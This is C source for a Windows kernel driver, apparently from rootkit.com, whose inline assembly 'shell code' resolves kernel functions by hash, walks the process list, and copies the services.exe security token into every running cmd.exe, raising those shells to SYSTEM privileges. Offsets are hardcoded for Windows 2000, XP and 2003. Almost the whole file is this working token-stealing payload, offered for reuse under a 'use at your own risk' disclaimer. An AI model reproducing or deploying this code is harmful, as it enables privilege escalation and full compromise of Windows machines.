;Authors: Nitin Kumar & Vipin Kumar
;NOTE:- We are not respomsible for anything.Use at your own risk
;If you develop anything using this code, please remember to give necessary credit to the authors.
;Project available at www.rootkit.com


#include <ntddk.h>
#include "ntdddisk.h"



VOID driverunload(PDRIVER_OBJECT DriverObject)
{    

  DbgPrint("Driver Unloaded Successfully \n");
}



//Entry point for driver


unsigned long framepointer;

#pragma warning(disable: 4731)

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath)
{


   DriverObject->DriverUnload   = driverunload;
   
__asm {

       pushfd
       pushad
       mov framepointer,ebp
        mov eax,0xffdf0900
        mov [eax],0x1
        
        //from here the  actual shell code starts
 	mov eax,fs:[0x38]
 	mov eax,[eax+0x4]
 again: and ax,0xf001
        dec eax
        cmp word ptr [eax],0x5a4d
        jnz again
        
        ;we have found base now store it
        mov  ebp,eax
        mov ebx,0xdaf46e78     ;Call IoGetCurrentProcess
	call CallExportedFunctionbyHash         ;returns system eprocess in eax
	
	push eax  ; store _EPROCESS
        
        
        
/*OS                 Activeprocesslink offset       imagenameoffset                         securitytoken offset
win 2k SP0            0xA0                              0x15c   original at 0x1fc                0x8c   original at 0x12c
WinXP SP0             0x88                              0xec                                     0x40 
win2k3 SP0            0x88                              0xcc                                     0x40  


*/       
        
 ;now _EPROCESS for kernel or System is in eax
xor ecx,ecx
mov cx, 0x88            ; active process link offset  !!!!!       OS and SP dependent data
add  eax, ecx ; get address of EPROCESS+ActiveProcessLinks
eproc_loop:
mov eax, [eax] ; get next EPROCESS struct
mov cx,  0xec                   ; image name offset         !!! OS and SP dependent data
cmp dword ptr [eax+ecx], 0x56524553; 0x53455256  ;"SERV"            ; is it SERVICES.EXE? xp and 2k3 knows upper case
je outof
cmp dword ptr [eax+ecx], 0x76726573 ; 0x73657276 ;"serv"            ; is it SERVICES.EXE? win2k knows lower case
je outof
jnz eproc_loop

outof:

; now  we store services.exe security token, so as we use it later on
mov cx,  0x40    ;SecurityTokenoffset   !!!! OS and SP dependent data
mov ebx,[eax + ecx ]       ;    to obtain token from offset of activeprocesslinks token


pop eax;  retore original _EPROCESS
//push ebx ; now on top of stack is security token 
//mov dword en],ebx ;token has been stored


;now we start again from beginning to find all cmd.exe and then try to escalate them to SYSTEM priv

 ;now _EPROCESS for kernel or System is in eax
xor ecx,ecx
mov cx, 0x88            ; active process link offset  !!!!!       OS and SP dependent data
add  eax, ecx ; get address of EPROCESS+ActiveProcessLinks



xor edx,edx
mov edx,[eax]       ;we will compare this value later on so we find out whether the list has been traversed fully 
mov eax, [eax]      ;so as to skip first process and check it when whole list has traversed

cmd_search_loop:
mov eax, [eax] ; get next EPROCESS struct it get to next activeprocess link _EPROCESS + 0x88 for xp sp 0

xor ecx,ecx
mov cx, 0xec
cmp DWORD ptr[eax+ecx],0x2e444d43 ;"CMD."            ; is it CMD.EXE? winxp knows upper case
je patchit
cmp dword ptr [eax+ecx], 0x2e646d63 ;"cmd."            ; is it cmd.exe?  win2k knows lower case
je patchit
jne donotpatchtoken          ;jmp takes 5 bytes but this takes 2 bytes
patchit:
mov cx, 0x40
mov [eax + ecx],ebx   ;;;200-0x88],ebx      ;replace it with services.exe token offset foe sec token is 200

donotpatchtoken:

cmp edx,eax  ; have we traversed fully
jne cmd_search_loop
        
        
        
jmp outofcode







;this functions jumps to any function in function in yhe export table
;it expects ebp contains base address of image , whose export table contains the function to search
;ebx conatins ror hash of export table function to find
CallExportedFunctionbyHash:
        	
		xor ecx,ecx                   ;ecx stores function number
		
		mov edi,[ebp+0x3c] ; to get offset to pe header
		mov edi,[ebp+edi+0x78] ; to get offset to export table

		add edi,ebp
callnextexporttableentry:
		mov edx,[edi+0x20]
		add edx,ebp
		mov esi,[edx+ecx*4]
		add esi,ebp
		xor eax,eax
		cdq

		
callnextbyte:
		lodsb
		ror edx,0xd
		add edx,eax
		test al,al
		jnz callnextbyte
		inc ecx       
		
		cmp edx,ebx
        	jnz  callnextexporttableentry
		dec ecx             ; hash number found
	
		mov ebx,[edi+0x24]
 		add ebx,ebp
 		mov cx,[ebx+ecx*2]
		mov ebx,[edi+0x1c]
		add ebx,ebp
		mov eax,[ebx+ecx*4]
		add eax,ebp    ;//function address arrives in eax now
		jmp eax   ;just call the function after finding it



outofcode:


;shell code ends here
mov ebp,framepointer
popad
popfd

}
                             
  DbgPrint("Driver loaded Successfully  and now will unload \n");
  
return 0;//status;
}